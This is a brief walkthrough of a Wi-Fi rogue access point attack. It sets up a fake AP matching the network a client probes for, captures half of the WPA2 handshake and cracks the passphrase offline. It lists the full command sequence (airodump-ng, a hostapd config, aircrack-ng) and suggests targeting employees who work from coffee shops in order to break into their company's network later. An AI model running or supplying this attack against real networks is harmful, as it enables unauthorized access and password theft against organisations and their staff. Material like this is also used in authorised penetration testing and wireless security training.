If there is not an AP but instead a client probing for an AP we can create a fake access point with the same info and capture half of a 4 way handshake based on the client connecting to our AP and trying to authenticate. We can use this to crack the password remotely and then go to the location to access the network.  This could work if you know employees like to work at lunch from the coffeeshop or go on the weekends with their work laptop to a remote location. 

Recon:

Sniff for probing clients and channel they are probing on: 
airodump-ng --band abg wlan0


Start Attack

Packet Capture:
First setup a packet capture on the target channel with first wireless card wlan0: 
airodump-ng --channel <#> --write capture wlan0

Setup FAKE AP config file with text editor (AP.conf):

interface=wlan1
hw_mode=g
channel= <CHANNEL> 
driver=nl80211
ssid= <SSID>
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=123456789
 

Run Attack AP: 
hostapd -d ap.conf


Now crack the 4-way Handshake: 
aircrack-ng -w <PasswordFile> capture-01.cap
